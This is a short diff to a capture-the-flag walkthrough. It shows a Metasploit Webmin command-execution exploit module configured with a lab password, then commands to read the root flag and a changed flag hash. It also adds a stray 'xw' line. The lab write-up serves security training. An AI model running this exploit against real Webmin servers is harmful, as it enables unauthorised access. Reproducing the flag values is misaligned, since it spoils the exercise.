@@ -350,7 +350,7 @@ Using the CMS dashboard version, use Metasploit to find a payload to execute aga
 On [exploit-db.com](https://www.exploit-db.com) we can find an [exploit](https://www.exploit-db.com/exploits/21851).
 
 Msfconsole:
-
+xw
 ```console
 msf6 > use exploit/unix/webapp/webmin_show_cgi_exec
 msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set PASSWORD videogamer124
@@ -386,8 +386,8 @@ root
 Find the flag:
 
 ```bash
-cd /home/agent47 
-cat user.txt
+cd /root
+cat root.txt
 ```
 
-> What is the root flag? `649ac17b1480ac13ef1e4fa579dac95c`
+> What is the root flag? `a4b945830144bdd71908d12d902adeee`
